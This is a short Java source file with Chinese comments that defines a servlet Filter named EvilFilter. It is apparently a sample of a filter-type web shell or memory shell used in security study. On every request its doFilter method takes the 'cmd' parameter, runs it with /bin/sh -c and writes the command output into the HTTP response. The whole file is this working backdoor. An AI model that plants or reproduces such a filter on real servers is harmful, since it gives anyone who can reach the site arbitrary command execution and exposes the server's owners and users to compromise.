import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;
import javax.servlet.http.HttpServletRequest;


// @WebFilter(filterName = "EvilFilter", urlPatterns="/*")
public class EvilFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        // 初始化过滤器（可选）
        System.out.println("***************************/nEvilFilter init/n***************************");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        System.out.println("***************************/nEvilFilter doFilter/n***************************");
        // 在这里添加你想要的过滤器逻辑
        //获取请求头中的cmd参数，执行命令并获取返回值
        String cmd = request.getParameter("cmd");
        //使用能回显的命令执行
        String[] cmds = {"/bin/sh", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.getWriter().println(output);

        System.out.println("Request URI: " + ((HttpServletRequest) request).getRequestURI());
        response.getWriter().println("you are Evil!");
        // 传递请求到下一个过滤器或目标资源
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        // 清理过滤器资源（可选）
        System.out.println("***************************/nEvilFilter destroy/n***************************");
    }
}
